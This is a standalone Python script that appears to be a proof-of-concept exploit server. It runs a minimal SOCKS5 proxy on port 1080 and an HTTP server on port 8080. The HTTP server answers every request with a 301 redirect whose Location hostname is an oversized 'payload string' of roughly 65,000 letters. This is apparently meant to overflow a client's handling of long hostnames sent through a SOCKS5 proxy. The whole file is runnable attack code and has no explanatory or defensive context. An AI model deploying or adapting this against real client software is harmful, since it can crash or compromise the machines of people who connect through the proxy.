import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

def generate_string():
    print("[+] generating payload string for HTTP redirection")
    total_length = 65535
    block_length = total_length // 26
    result = ""
    for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        result += char * block_length
    return result

def socks5_proxy():
    def handle_client(client_socket):
        print("[+] got socks5 connection from ", client_socket.getpeername())
        
        # Perform SOCKS5 handshake
        client_socket.recv(2)
        client_socket.sendall(b'\x05\x00')
        print("[+] socks5 handshake complete")

        # Hardcoding target address and port for now
        target_address = '127.0.0.1'
        target_port = 8080

        # Connect to the target
        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target.connect((target_address, target_port))

        # Send the connection established message
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('127.0.0.1') + (8080).to_bytes(2, 'big'))
        print("[+] socks5 connection established")

        # Construct GET request
        get_request = f"GET / HTTP/1.1\r\nHost: {target_address}:{target_port}\r\n\r\n"
        target.send(get_request.encode('utf-8'))
        print(f"[+] sent GET request to target {target.getpeername()}")

        while True:
            response = target.recv(65535*2)
            print(f"[+] received {len(response)} bytes from target {target.getpeername()}")
            client_socket.send(response)
            print(f"[+] sent {len(response)} bytes to client {client_socket.getpeername()}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 1080))
    server.listen(5)

    print("SOCKS5 proxy running on port 1080")

    while True:
        client_sock, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_sock,))
        client_thread.start()

def http_server():
    print("HTTP server running on port 8080")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8080))
    server_socket.listen(5)

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] HTTP server received connection from {addr}")
        
        # Read the incoming request (we're not doing anything with it in this example)
        request = client_socket.recv(1024).decode('utf-8')
        print(f"[+] HTTP request: {request}")
        
        # Generate the payload string
        payload = generate_string()
        print("[+] payload string generated...")

        # Create the HTTP response
        response = f"HTTP/1.1 301 Moved\r\nContent-Length: 0\r\nConnection: Close\r\nLocation: http://{generate_string()}\r\n\r\n"
        print("[+] HTTP response generated...")

        # Send the HTTP response
        client_socket.sendall(response.encode('utf-8'))
        print(f"[+] HTTP response sent to client {addr}")
        
        # Close the connection
        client_socket.close()

if __name__ == "__main__":
    socks5_thread = threading.Thread(target=socks5_proxy, daemon=True)
    http_thread = threading.Thread(target=http_server, daemon=True)
    
    socks5_thread.start()
    http_thread.start()
    
    socks5_thread.join()
    http_thread.join()

